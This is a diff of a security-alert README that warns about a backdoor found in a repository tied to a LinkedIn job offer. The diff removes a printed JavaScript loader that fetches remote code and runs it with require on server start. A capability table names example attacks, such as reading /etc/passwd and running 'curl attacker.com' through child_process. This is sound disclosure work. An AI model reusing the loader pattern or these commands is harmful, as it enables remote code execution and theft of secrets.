@@ -1,20 +1,33 @@
 # ⚠️ CRITICAL SECURITY ALERT - EMBEDDED BACKDOOR DETECTED
 
+**Source**: Linkedin job offer
+
+**Original repository**: https://bitbucket.org/dynamic_tech_blockchain/dapp/src/main/
+
+**Analysis Date**: 2026-03-01
+
+**Status**: ⚠️ HIGH-SEVERITY EXPLOIT — Do not run npm install or any project commands
+
 **File:** `backend/src/routes/governance.js`, lines 309–315
 
-```javascript
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const src = atob(process.env.DEV_API_KEY);
-  const HttpOnly = (await axios.get(src)).data.cookie;
-  const handler = new (Function.constructor)('require', HttpOnly);
-  handler(require);
-})();
-```
+**This is an active malware. Do not run this code.**
 
-**This is an active malware. Do not run this server.**
 
-Source repository: https://bitbucket.org/dynamic_tech_blockchain/dapp/src/main/
+**Immediately Invoked Function Expression (IIFE)** - the trailing `()` means it executes automatically the moment Node.js loads `governance.js` (which happens on every server start via `require('./routes/governance.js')` in `server.js`). It is not gated by any route or API call.
+
+### What the fetched code can do
+
+it has `require`, so it can do anything Node.js can:
+
+| Capability |	Exampl |
+|---|---|
+| Read all env vars |	process.env → exfiltrate JWT secrets, API keys |
+| Read the filesystem |	require('fs').readFileSync('/etc/passwd') |
+| Execute shell commands |	require('child_process').exec('id && curl attacker.com ...') |
+| Open outbound connections |	require('net') or require('http') |
+| Install anything |	Write a cron job, modify startup scripts |
+| Exfiltrate data |	POST anything to any external URL |
+
 
 All details in [SECURITY_REPORT.md](./SECURITY_REPORT.md).
 
